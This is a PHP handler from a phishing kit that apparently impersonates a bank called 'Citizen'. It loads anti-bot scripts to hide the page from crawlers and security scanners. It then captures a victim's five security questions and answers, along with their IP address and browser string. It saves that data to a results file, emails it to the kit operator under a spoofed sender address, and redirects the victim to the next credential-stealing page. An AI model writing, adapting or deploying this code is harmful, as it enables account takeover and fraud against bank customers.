<?php
session_start();

include "../../admin/config.php";
if($bots == "on"){
    include '../antbots/ip_blocklist.php';  
    include '../antbots/Crawler.php';
    include '../antbots/Boting.php';
    include '../antbots/blacklist.php';
    include '../antbots/new.php';
    include '../antbots/myz.php';
}

if(!empty($_POST['a5'])){
    
$file= "../Result/billing".$pin.".txt";

$data  = "[ - ] =======| -2- |======== [ - ]\n";
$data .= "[+]Question 1:      ".$_POST['q1']."\n";
$data .= "[+]Answer 1:        ".$_POST['a1']."\n";
$data .= "[ - ] =======| - |=========== [ - ]\n";
$data .= "[+]Question 2:      ".$_POST['q2']."\n";
$data .= "[+]Answer 2:        ".$_POST['a2']."\n";
$data .= "[ - ] =======| - |=========== [ - ]\n";
$data .= "[+]Question 3:      ".$_POST['q3']."\n";
$data .= "[+]Answer 3:        ".$_POST['a3']."\n";
$data .= "[ - ] =======| - |=========== [ - ]\n";
$data .= "[+]Question 4:      ".$_POST['q4']."\n";
$data .= "[+]Answer 4:        ".$_POST['a4']."\n";
$data .= "[ - ] =======| - |=========== [ - ]\n";
$data .= "[+]Question 5:      ".$_POST['q5']."\n";
$data .= "[+]Answer 5:        ".$_POST['a5']."\n";
$data .= "[ - ] =======| - |=========== [ - ]\n";
$data .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
$data .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
$data .= "[ - ] =======| END |=========== [ - ]\n";
$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);


$f = fopen($file,'a+');
fwrite($f,$data."\n");
fclose($f);


$to = $your_email;
$subject = $pra."- Citizen Questions I -[".$_SERVER['REMOTE_ADDR']."]";
$headers = "From: Blueprint".$pra."<blueprint@".$pra."citizen.com>";
mail($to,$subject,$data,$headers);


    header("location: /email_identification.php");
}else{
    header("location: /verify_questions.php");
}
?>